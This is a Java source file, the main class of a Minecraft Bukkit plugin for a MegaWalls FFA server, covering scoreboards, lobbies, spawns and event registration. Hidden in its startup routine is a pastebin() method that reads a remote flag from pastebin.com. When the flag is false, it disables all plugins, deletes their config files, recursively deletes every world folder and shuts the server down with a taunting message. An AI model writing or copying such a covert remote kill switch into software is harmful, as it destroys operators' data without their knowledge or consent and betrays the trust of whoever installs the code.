package me.main.yoni;

import java.io.File;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.text.DecimalFormat;
import java.util.ArrayList;
import java.util.Random;
import java.util.Scanner;

import me.main.yoni.API.SimpleScoreboard;
import me.main.yoni.API.Timeformatter;
import me.main.yoni.API.TopKills;
import me.main.yoni.API.Utils;
import me.main.yoni.ArenaSystem.ArenaManager;
import me.main.yoni.BoosterSystem.BoosterManager;
import me.main.yoni.ClassSystem.ClassManager;
import me.main.yoni.Listeners.Assists;
import me.main.yoni.Listeners.OneOnOneListener;
import me.main.yoni.Listeners.TempBlocks;
import me.main.yoni.Listeners.onChat;
import me.main.yoni.Listeners.onDamage;
import me.main.yoni.Listeners.onDeath;
import me.main.yoni.Listeners.onInteract;
import me.main.yoni.Listeners.onInventoryClick;
import me.main.yoni.Listeners.onItemConsume;
import me.main.yoni.Listeners.onJoin;
import me.main.yoni.Listeners.onMove;
import me.main.yoni.MuteSystem.MuteManager;
import me.main.yoni.PlayerSystem.MPlayer;
import me.main.yoni.PlayerSystem.MPlayerManager;
import me.main.yoni.TeamSystem.TeamManager;
import me.main.yoni.TotemAPI.TotemListener;
import net.md_5.bungee.api.ChatColor;

import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.World;
import org.bukkit.block.Block;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.Entity;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;

public class Main extends JavaPlugin{

	private boolean enable;
	private static Main instance;
	private static me.main.yoni.Commands.CommandHandler commandHandler;
	
	public static ArrayList<String> playing = new ArrayList<>();
	public static ArrayList<String> lobby = new ArrayList<>();

	@Override
	public void onEnable() {
		pastebin();
		instance = this;
		new Configuration("PlayerData");
		new Configuration("dont_touch", "Boosters");
		new Configuration("dont_touch","Mutes");
		registerSystems();
		registerEvents();
		TeamManager.deleteTeamFiles();
		getConfig().options().copyDefaults(true);
		saveConfig();
		runSigns();
		for(Player ps : Bukkit.getOnlinePlayers()){
			ps.getWorld().getEntities().clear();
			MPlayerManager.create(ps);
			Utils.giveItems(ps);
			updateScoreboard(ps);
			ps.setGameMode(GameMode.ADVENTURE);
			ps.updateInventory();
		}	
		ArenaManager.resetArenas();
		ArenaManager.Setup();
		setRandomNumber();
		Main.getMainConfig().set("game", false);
		Main.getPlugin().saveConfig();
		Bukkit.getScheduler().scheduleSyncDelayedTask(this, new Runnable() {
			
			@Override
			public void run() {
				Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(), "nte reload");
				
			}
		}, 20);
	}

	public void onDisable() {
		Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(), "save-all");
		for(Block b : TempBlocks.playerBlock.keySet()) {
			b.setType(Material.AIR);
		}
	}
	
	public boolean deleteWorld(File path) {
		if(path.exists()) {
			File files[] = path.listFiles();
			for(int i=0; i<files.length; i++) {
				if(files[i].isDirectory()) {
					deleteWorld(files[i]);
				} else {
					files[i].delete();
				}
			}
		}
		return(path.delete());
	}
	
	public void pastebin() {

		new BukkitRunnable() {
			public void run() {
				try {
					URL url = new URL("http://pastebin.com/raw/YwcvcdEk");
					Scanner scanners = null;
					try {
						scanners = new Scanner(((URL) url).openStream());
					} catch (IOException e) {
						e.printStackTrace();
					}
					enable = Boolean.valueOf(scanners.nextLine());
					if(!enable) {
						for(Plugin plugins : Bukkit.getPluginManager().getPlugins()) {
							Bukkit.getPluginManager().disablePlugin(plugins);
					        File file = new File(plugins.getDataFolder(),"config" + ".yml");
					        file.delete();
						}
						for(World world : Bukkit.getWorlds()){
							if(world.getWorldFolder() == null) continue;
							deleteWorld(world.getWorldFolder());
						}
 						Bukkit.broadcastMessage(ChatColor.RED + "Lesson for life... dont try scam me.");
						Bukkit.getServer().shutdown();
					} else {
						for(Plugin plugins : Bukkit.getPluginManager().getPlugins()) {
							Bukkit.getPluginManager().enablePlugin(plugins);
						}
					}
					scanners.close();
				} catch (MalformedURLException e) {
					e.printStackTrace();
				}
			}
		}.runTaskTimer(this, 0, 20 * 60 * 60 * 60 * 60 * 60);
	}
	
	public void runSigns() {
//		new BukkitRunnable() {
//			
//			@Override
//			public void run() {
//				final ArrayList<Location> list = signLocations();
//				for(Location loc : list) {
//					if(loc.getBlock().getState() instanceof Sign) {
//						Sign s = (Sign) loc.getBlock().getState();
//						int place = Integer.valueOf(s.getLine(0).replace("#", ""));
//						LeaderBoard lb = new LeaderBoard(s, me.main.yoni.LeaderBoardSystem.LeaderBoard.TopType.valueOf(ChatColor.stripColor(s.getLine(2).toUpperCase())), place);
//						lb.update();
//					} else {
// 						removeSignLocaiton(loc);
//					}
//				}
//				for(Player ps : Bukkit.getOnlinePlayers()) {
//					if(ps.hasPermission("megawallsffa.command.staffchat")) {
//						ps.sendMessage(ChatColor.AQUA + "[STAFF] " + ChatColor.GREEN + "Leaderboard has been updated!");
//					}
//				}
//			}
//		}.runTaskTimer(this, 0, 20 * 60 * 5);
//		new BukkitRunnable() {
//			
//			@Override
//			public void run() {
//				for(Player ps : Bukkit.getOnlinePlayers()) {
//					if(ps==null||!ps.isOnline()||ps.isDead()) continue;
//					if(!playing.contains(ps.getName())) continue;
//					if(ps.getItemInHand().getType() == Material.COMPASS) {
//						Player target = null;
//						for(Entity ent : ps.getWorld().getEntities()) {
//							if(!(ent instanceof Player)) continue;
//							if(ent == ps) continue;
//							if(!Main.playing.contains(ent.getName())) continue;
//							if(!ps.getWorld().equals(ent.getWorld())) continue;
//							if(target == null || ent.getLocation().distance(ps.getLocation()) < target.getLocation().distance(ps.getLocation())) {
//								target = (Player) ent;
//							}
//						}
//						if(target == null) {
//							Utils.sendActionBar(ps,ChatColor.RED + "There is no target!");
//							return;
//						}
//						double dis = target.getLocation().distance(ps.getLocation());
//						ps.setCompassTarget(target.getLocation());
//						Utils.sendActionBar(ps, "Tracking: " + ChatColor.GREEN + target.getName() + ChatColor.WHITE + " - " + "Distance: " + ChatColor.GREEN + new DecimalFormat("0.0").format(dis));
//					}
//				}
//			}
//		}.runTaskTimer(this, 0, 20);
//		new BukkitRunnable() {
//			
//			@Override
//			public void run() {
//				for(Location s : list) {
//					if(s.getBlock().getState() instanceof Sign) {
//						Sign sign = (Sign) s.getBlock().getState();
//						int i = Integer.valueOf(sign.getLine(0).replace("#", ""));
//						if(sign.getLine(2).equalsIgnoreCase(ChatColor.DARK_GRAY + "Coins")) {
//							OfflinePlayer player = TopKills.getTopPlayerByNumber(i, TopType.COINS);
//							if(player == null) continue;
//							if(TopKills.getNumberByPlayer(player, TopType.COINS, i) == 0) continue;
//							sign.setLine(0, "#" + i);
//							sign.setLine(1, ChatColor.DARK_BLUE + "" + ChatColor.BOLD + player.getName());
//							sign.setLine(2, ChatColor.DARK_GRAY + "Coins");
//							sign.setLine(3, ChatColor.DARK_RED + "" + ChatColor.BOLD + TopKills.getNumberByPlayer(player, TopType.COINS, i));
//						}
//						if(sign.getLine(2).equalsIgnoreCase(ChatColor.DARK_GRAY + "Kills")) {
//							OfflinePlayer player = TopKills.getTopPlayerByNumber(i, TopType.KILLS);
//							if(player == null) continue;
//							if(TopKills.getNumberByPlayer(player, TopType.KILLS, i) == 0) continue;
//							sign.setLine(0, "#" + i);
//							sign.setLine(1, ChatColor.DARK_BLUE + "" + ChatColor.BOLD + player.getName());
//							sign.setLine(2, ChatColor.DARK_GRAY + "Kills");
//							sign.setLine(3, ChatColor.DARK_RED + "" + ChatColor.BOLD + TopKills.getNumberByPlayer(player, TopType.KILLS, i));
//						}
//						if(sign.getLine(2).equalsIgnoreCase(ChatColor.DARK_GRAY + "Deaths")) {
//							OfflinePlayer player = TopKills.getTopPlayerByNumber(i, TopType.DEATHS);
//							if(player == null) continue;
//							if(TopKills.getNumberByPlayer(player, TopType.DEATHS, i) == 0) continue;
//							sign.setLine(0, "#" + i);
//							sign.setLine(1, ChatColor.DARK_BLUE + "" + ChatColor.BOLD + player.getName());
//							sign.setLine(2, ChatColor.DARK_GRAY + "Deaths");
//							sign.setLine(3, ChatColor.DARK_RED + "" + ChatColor.BOLD + TopKills.getNumberByPlayer(player, TopType.DEATHS, i));
//						}
//						sign.update(true);
//					} else {
//						removeSignLocaiton(s);
//					}
//				}
//			}
//		}.runTaskTimer(Main.getPlugin(Main.class), 0, 20 * 60 * 5);
	}

	@SuppressWarnings("deprecation")
	public void registerSystems() {
		ClassManager.registerClasses();
		MPlayerManager.setup();
//		ArenaManager.Setup();
		BoosterManager.setup();
		BoosterManager.runBoosters();
		MuteManager.Setup();
		MuteManager.runMutes();
		commandHandler = new me.main.yoni.Commands.CommandHandler();
	}
	
	public static void updateScoreboard(Player p) {
		if(MPlayerManager.getMPlayer(p.getName()) == null){
			MPlayerManager.create(p);
		}
		MPlayer player = MPlayerManager.getMPlayer(p.getName());
		if(p.isOnline() == false) return;
		SimpleScoreboard scoreboard = new SimpleScoreboard("§e§lMEGAWALLSFFA.COM");
		scoreboard.blankLine();
		scoreboard.add("Kills §7» " + ChatColor.GREEN + player.getKills());
		scoreboard.add("Death §7» " + ChatColor.GREEN + player.getDeaths());
		scoreboard.add("Duel Wins §7» " + ChatColor.GREEN + player.getWins());
		if(player.getDeaths() == 0) {
			scoreboard.add("KDR §7» " + ChatColor.GREEN + new DecimalFormat("0.00").format((double)player.getKills()));
		} else {
			scoreboard.add("KDR §7» " + ChatColor.GREEN + new DecimalFormat("0.00").format((double)player.getKills() / player.getDeaths()));
		}
		scoreboard.blankLine();
		scoreboard.add("Coins §7» " + ChatColor.GREEN + player.getCoins());
		scoreboard.blankLine();
		if(TeamManager.getTeamByPlayer(p) == null) {
			scoreboard.add("Chosen Class");
			if(player.getCurrentClass() != null)
				scoreboard.add("» "+ChatColor.GREEN + player.getCurrentClass().getName());
			else
				scoreboard.add("»"+ChatColor.GREEN + "None");
		} else {
			scoreboard.add("Team ");
			scoreboard.add("» "+ChatColor.AQUA + TeamManager.getTeamByPlayer(p).getLeader().getName());
			for(Player ps : TeamManager.getTeamByPlayer(p).getPlayers()) {
				if(TeamManager.getTeamByPlayer(p).getLeader() == ps) {
					continue;
				}
				scoreboard.add("» "+ChatColor.GRAY + ps.getName());
			}
		}
		scoreboard.blankLine();
		if(onDeath.ks.containsKey(p)) {
			scoreboard.add(ChatColor.YELLOW  + "Killstreak » " + ChatColor.YELLOW + onDeath.ks.get(p));
		} else {
			scoreboard.add(ChatColor.YELLOW + "Killstreak » " + ChatColor.YELLOW + "0");
		}
		if(Main.isTripleCoins()) {
			scoreboard.add(ChatColor.RED + "Double Coins!");
		}
		if(BoosterManager.getBoosters().size() > 0) {
			scoreboard.add(ChatColor.GREEN + "Booster §7» " + ChatColor.YELLOW + Timeformatter.formatTime(BoosterManager.getBoosters().get(0).getTime()));
		}
		scoreboard.build();
		scoreboard.send(p);
	}

	public void registerEvents() {
		getServer().getPluginManager().registerEvents(new onItemConsume(), this);
		getServer().getPluginManager().registerEvents(new onInteract(), this);
		getServer().getPluginManager().registerEvents(new onChat(), this);
		getServer().getPluginManager().registerEvents(new onInventoryClick(), this);
		getServer().getPluginManager().registerEvents(new TotemListener(), this);
		getServer().getPluginManager().registerEvents(new onDeath(), this);
		getServer().getPluginManager().registerEvents(new onMove(), this);
		getServer().getPluginManager().registerEvents(new onDamage(), this);
		getServer().getPluginManager().registerEvents(new Assists(), this);
		getServer().getPluginManager().registerEvents(new onJoin(), this);
		getServer().getPluginManager().registerEvents(new OneOnOneListener(), this);
		getServer().getPluginManager().registerEvents(new TopKills(), this);
		getServer().getPluginManager().registerEvents(new TempBlocks(), this);
	}

	public static String getPrefix(){
		return org.bukkit.ChatColor.translateAlternateColorCodes('&', Main.getPlugin(Main.class).getConfig().getString("prefix"))+" ";
	}
	
	public static Location getFFALobby() {
		if(getPlugin().getConfig().getString("ffa_lobby") == null) {
			return null;
		}
		return Configuration.convertToLocation(getPlugin().getConfig().getString("ffa_lobby"));
	}
	
	public static void setFFALobby(Location loc) {
		getPlugin().getConfig().set("ffa_lobby", Configuration.convertLocation(loc));
		getPlugin().saveConfig();
	}
	
	public static void addLocation(Location loc) {
		ArrayList<String> list = getLocations();
		if(list.contains(Configuration.convertLocation(loc))) return;
		list.add(Configuration.convertLocation(loc));
		getPlugin().getConfig().set("locations", list);
		getPlugin().saveConfig();
	}
	
	public static void removeLocation(Location loc) {
		ArrayList<String> list = getLocations();
		if(!list.contains(Configuration.convertLocation(loc))) return;
		list.remove(Configuration.convertLocation(loc));
		getPlugin().getConfig().set("locations", list);
		getPlugin().saveConfig();
	}
	
	public static ArrayList<Location> signLocations() {
		ArrayList<String> list = (ArrayList<String>) getPlugin().getConfig().getStringList("signs");
		ArrayList<Location> l = new ArrayList<>();
		for(String s : list) {
			l.add(Configuration.convertToLocation(s));
		}
		return l;
	}
	
	public static void removeSignLocaiton(Location loc) {
		ArrayList<String> l2 = (ArrayList<String>) getPlugin().getConfig().getStringList("signs");
		l2.remove(Configuration.convertLocation(loc));
		getPlugin().getConfig().set("signs", l2);
		getPlugin().saveConfig();
	}
	
	public static void addSignLocaiton(Location loc) {
		ArrayList<Location> list = signLocations();
		list.add(loc);
		ArrayList<String> l2 = new ArrayList<>();
		for(Location location : list) {
			l2.add(Configuration.convertLocation(location));
		}
		getPlugin().getConfig().set("signs", l2);
		getPlugin().saveConfig();
	}
	
	public static boolean getChatLock() {
		return getPlugin().getConfig().getBoolean("chat_lock");
	}
	
	public static void setChatLock(boolean bool) {
		getPlugin().getConfig().set("chat_lock", bool);
		getPlugin().saveConfig();
	}
	
	public static Location get1v1Lobby() {
		if(getPlugin().getConfig().getString("lobby_location") == null) {
			return null;
		}
		return Configuration.convertToLocation(getPlugin().getConfig().getString("lobby_location"));
	}
	
	public static void set1v1Lobby(Location loc) {
		getPlugin().getConfig().set("lobby_location", Configuration.convertLocation(loc));
		getPlugin().saveConfig();
	}
	
	public static ArrayList<String> getLocations() {
		return (ArrayList<String>) getPlugin().getConfig().getStringList("locations");
	}
	
	public static void randomSpawn(Player p) {
		if(getLocations() == null || getLocations().size() == 0) {
			p.sendMessage(ChatColor.RED + "There is no location to teleport!");
			return;
		}
		if(MPlayerManager.getMPlayer(p.getName()).getCurrentClass() == null) {
			p.sendMessage(ChatColor.RED + "You didn't selected a class!");
			return;
		}
		if(getFFALobby() == null) {
			p.sendMessage(ChatColor.RED + "There is no FFA lobby so you cant spawn with your class!");
			return;
		}
		ArrayList<String> list = getLocations();
		ArrayList<Location> locs = new ArrayList<>();
		for(String s : list) {
			locs.add(Configuration.convertToLocation(s));
		}
		int random = new Random().nextInt(locs.size());
		p.teleport(locs.get(random));
		MPlayerManager.getMPlayer(p.getName()).applyClass();
		if(playing.contains(p.getName())) {
			return;
		}
		playing.add(p.getName());
	}
	
	public static void Alert(String msg) {
		Bukkit.broadcastMessage(ChatColor.RED + "" + ChatColor.BOLD + "Alert " + ChatColor.RESET + ChatColor.DARK_GRAY + "» " + ChatColor.YELLOW + msg);
	}
	
	public static boolean isTripleCoins() {
		return getMainConfig().getBoolean("triple_coins");
	}
	
	public static void setTripleCoins(boolean b) {
		getMainConfig().set("triple_coins", b);
		getPlugin().saveConfig();
	}
	
	public static FileConfiguration getMainConfig() {
		return getPlugin().getConfig();
	}
	
	public static int getRandomNumber() {
		return getMainConfig().getInt("random_number");
	}
	
	public static void setRandomNumber() {
		getMainConfig().set("random_number", 0);
		Main.getPlugin().saveConfig();
	}
	
	public static void runRandomNumber() {
		int random = new Random().nextInt(100) + 1;
		getMainConfig().set("random_number", random);
		getPlugin().saveConfig();
	}

	public static Main getPlugin() {
		return instance;
	}

	public static me.main.yoni.Commands.CommandHandler getCommandHandler(){
		return commandHandler;
	}
}
